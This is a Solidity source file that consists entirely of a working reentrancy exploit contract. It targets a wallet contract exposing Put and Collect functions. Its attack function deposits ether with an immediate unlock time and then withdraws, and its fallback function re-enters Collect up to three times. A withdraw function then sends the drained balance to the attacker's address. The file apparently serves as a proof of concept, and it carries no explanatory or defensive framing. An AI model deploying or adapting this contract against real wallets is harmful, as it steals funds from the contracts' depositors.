pragma solidity ^0.4.25;

interface IWALLET {
    function Put(uint _unlockTime) external payable;
    function Collect(uint _am) external payable;
}

contract ReentrancyExploit {
    IWALLET public vulnerableWallet;
    address public owner;
    uint public attackCount;
    uint public withdrawAmount = 1 ether;

    constructor(address _target) public {
        vulnerableWallet = IWALLET(_target);
        owner = msg.sender;
    }

    // Fallback will be called during reentrancy
    function() public payable {
        if (attackCount < 3) { // limit reentrancy depth
            attackCount++;
            vulnerableWallet.Collect(withdrawAmount);
        }
    }

    // Initial deposit to trigger vulnerability
    function attack() public payable {
        require(msg.value >= withdrawAmount);
        attackCount = 0;
        vulnerableWallet.Put.value(msg.value)(now - 1); // immediate unlock
        vulnerableWallet.Collect(withdrawAmount);
    }

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}

